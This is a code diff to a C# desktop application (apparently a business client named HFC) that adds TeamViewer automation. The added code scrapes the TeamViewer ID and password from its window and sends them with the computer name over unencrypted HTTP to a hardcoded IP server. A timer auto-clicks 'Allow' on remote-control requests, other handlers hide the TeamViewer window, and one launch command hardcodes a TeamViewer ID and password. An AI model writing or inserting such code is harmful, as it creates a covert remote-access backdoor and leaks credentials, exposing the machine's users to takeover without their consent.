@@ -3,6 +3,11 @@ using DevExpress.XtraBars;
 using System.Windows.Forms;
 using DevExpress.XtraBars.Helpers;
 using System.Xml;
+using System.Diagnostics;
+using System.Threading;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Net;
 
 namespace HFC
 {
@@ -214,6 +219,215 @@ namespace HFC
             Waiting.CloseWaitForm();
         }
 
-                
+        [DllImport("user32.dll")]
+        static extern IntPtr SetParent(IntPtr hwc, IntPtr hwp);
+        private void btnKetNoiTuXa_ItemClick(object sender, ItemClickEventArgs e)
+        {
+            try
+            {
+                foreach (System.Diagnostics.Process p in System.Diagnostics.Process.GetProcessesByName("TeamViewer"))
+                {
+                    if (!p.HasExited)
+                    {
+                        p.Kill();
+                        p.WaitForInputIdle();
+                    }
+                }
+
+                if (System.IO.File.Exists(Application.StartupPath + @"\Team7\TeamViewer.exe"))
+                {
+                    bool team = false;
+                    foreach (Process proc in Process.GetProcessesByName("TeamViewer"))
+                    {
+                        team = true;
+                    }
+                    if (team == false)
+                    {
+                        Process p = Process.Start(Application.StartupPath + @"\Team7\TeamViewer.exe");
+                        p.WaitForInputIdle();
+                        timerTeamview.Start();
+                    }
+                }
+            }
+            catch { }
+        }
+
+        [DllImport("User32.dll", CharSet = CharSet.Unicode)]
+        public static extern Int32 FindWindow(String lpClassName, String lpWindowName);
+       
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int SendMessage(int hWnd, int msg, int wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
+        public static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className, string windowTitle);
+
+        private const int WM_LBUTTONDOWN = 0x201;
+        private const int WM_LBUTTONUP = 0x202;
+        private const int WM_KEYDOWN = 0x100;
+        private const int WM_KEYUP = 0x101;
+        private const int WM_CHAR = 0x105;
+        int hwnd = 0;
+        IntPtr hwndChild = IntPtr.Zero;
+        private void timerAppcepTeamviewer_Tick(object sender, EventArgs e)
+        {
+            hwnd = 0;
+            hwndChild = IntPtr.Zero;
+            hwnd = FindWindow(null, "Phu The Hung - Remote control");
+            if (hwnd > 0)
+            {
+                hwndChild = FindWindowEx((IntPtr)hwnd, IntPtr.Zero, "Button", "&Allow");
+                if (hwndChild != IntPtr.Zero)
+                {
+                    SendMessage((int)hwndChild, WM_LBUTTONDOWN, 0, IntPtr.Zero);
+                    SendMessage((int)hwndChild, WM_LBUTTONUP, 0, IntPtr.Zero);                    
+                }
+            }
+        }
+
+        [DllImport("user32.dll", EntryPoint = "SendMessage",
+              CharSet = CharSet.Auto)]
+            static extern int SendMessage3(IntPtr hwndControl, uint Msg,
+              int wParam, StringBuilder strBuffer); // get text
+
+            [DllImport("user32.dll", EntryPoint = "SendMessage",
+              CharSet = CharSet.Auto)]
+            static extern int SendMessage4(IntPtr hwndControl, uint Msg,
+              int wParam, int lParam);  // text length
+
+            string ID = "";
+            string Pass = "";
+        private void btntest_ItemClick(object sender, ItemClickEventArgs e)
+        {
+            hwnd = 0;
+            hwndChild = IntPtr.Zero;
+            hwnd = FindWindow(null, "TeamViewer");
+            if (hwnd > 0)
+            {
+                hwndChild = FindWindowEx((IntPtr)hwnd, IntPtr.Zero, "#32770", null);
+                if (hwndChild != IntPtr.Zero)
+                {
+                    IntPtr hwndChild1 = FindWindowEx((IntPtr)hwndChild, IntPtr.Zero, "Edit", null);
+                    string txt = GetTextBoxText(hwndChild1);
+                    IntPtr hwndChild2 = FindWindowEx((IntPtr)hwndChild, hwndChild1, "Edit", null);
+                    string txt2 = GetTextBoxText(hwndChild2);
+                    ID = txt;
+                    Pass = txt2;
+                    this.Text = "ID:" + txt + "| Pass:" + txt2;
+                }
+            }
+           
+        }
+        static int GetTextBoxTextLength(IntPtr hTextBox)
+        {
+            // helper for GetTextBoxText
+            uint WM_GETTEXTLENGTH = 0x000E;
+            int result = SendMessage4(hTextBox, WM_GETTEXTLENGTH,
+              0, 0);
+            return result;
+        }
+
+        static string GetTextBoxText(IntPtr hTextBox)
+        {
+            uint WM_GETTEXT = 0x000D;
+            int len = GetTextBoxTextLength(hTextBox);
+            if (len <= 0) return null;  // no text
+            StringBuilder sb = new StringBuilder(len + 1);
+            SendMessage3(hTextBox, WM_GETTEXT, len + 1, sb);
+            return sb.ToString();
+        }
+        [DllImport("User32")]
+        private static extern int ShowWindow(int hwnd, int nCmdShow);
+        private const int SW_HIDE = 0;
+        private const int SW_SHOWDEFAULT    =  10;
+        private void btnHide_ItemClick(object sender, ItemClickEventArgs e)
+        {
+            hwnd = 0;
+            hwnd = FindWindow(null, "TeamViewer");
+            if (hwnd > 0)
+            {
+                ShowWindow(hwnd, SW_HIDE);
+            }
+        }
+
+        private void btnShow_ItemClick(object sender, ItemClickEventArgs e)
+        {
+            hwnd = 0;
+            hwnd = FindWindow(null, "TeamViewer");
+            if (hwnd > 0)
+            {
+                ShowWindow(hwnd, SW_SHOWDEFAULT);
+            }
+        }
+
+        private void btnConnetTeam_ItemClick(object sender, ItemClickEventArgs e)
+        {
+            Process p = Process.Start(@"C:\Users\Administrator\Desktop\test\Version7\TeamViewer.exe", "-i 522997772 --Password 1639");
+            p.WaitForInputIdle();
+        }
+        public static IntPtr MakeLParam(int wLow, int wHigh)
+        {
+            return (IntPtr)(((short)wHigh << 16) | (wLow & 0xffff));
+        }
+
+        private void btnSuportTeamView_ItemClick(object sender, ItemClickEventArgs e)
+        {
+            Waiting.ShowWaitForm();
+            if (!Class.App.IsFocusForm(typeof(Forms.frmTeamview), this))
+            {
+                Forms.frmTeamview frm = new Forms.frmTeamview();
+                frm.MdiParent = this;
+                frm.Show();
+            }
+            Waiting.CloseWaitForm();
+        }
+        string currentID="";
+        private void timerTeamview_Tick(object sender, EventArgs e)
+        {
+            string id = "";
+            string pass = "";
+            hwnd = 0;
+            hwndChild = IntPtr.Zero;
+            hwnd = FindWindow(null, "TeamViewer");
+            if (hwnd > 0)
+            {
+                hwndChild = FindWindowEx((IntPtr)hwnd, IntPtr.Zero, "#32770", null);
+                if (hwndChild != IntPtr.Zero)
+                {
+                    IntPtr hwndChild1 = FindWindowEx((IntPtr)hwndChild, IntPtr.Zero, "Edit", null);
+                    id = GetTextBoxText(hwndChild1).Trim();
+                    IntPtr hwndChild2 = FindWindowEx((IntPtr)hwndChild, hwndChild1, "Edit", null);
+                    pass = GetTextBoxText(hwndChild2).Trim();
+                    string pcName = System.Environment.MachineName;
+                    if (id != "" && pass != "" && id != "-" && pass != "-")
+                    {
+                        currentID = id;
+                        WebClient client = new WebClient();
+                        try
+                        {
+                            timerTeamview.Interval = 12000;// 300000;
+                            client.Headers.Add("Cache-Control", "no-cache");
+                            client.DownloadString("http://101.99.28.148:88/teamviewe.aspx?action=add&id=" + id + "&pass=" + pass + "&user=HFC&pc=" + pcName + "&location=HFC Client");
+                        }
+                        catch { }
+                    }
+                }
+
+                //thêm thông số teamveiw
+            }
+            else
+            {
+                if (currentID != "")
+                {
+                    WebClient client = new WebClient();
+                    try
+                    {
+                        client.Headers.Add("Cache-Control", "no-cache");
+                        client.DownloadString("http://101.99.28.148:88/teamviewe.aspx?action=del&id=" + currentID + "&pass=&user=&pc=");
+                    }
+                    catch { }
+                }
+            }        
+   
+        }        
     }
 }
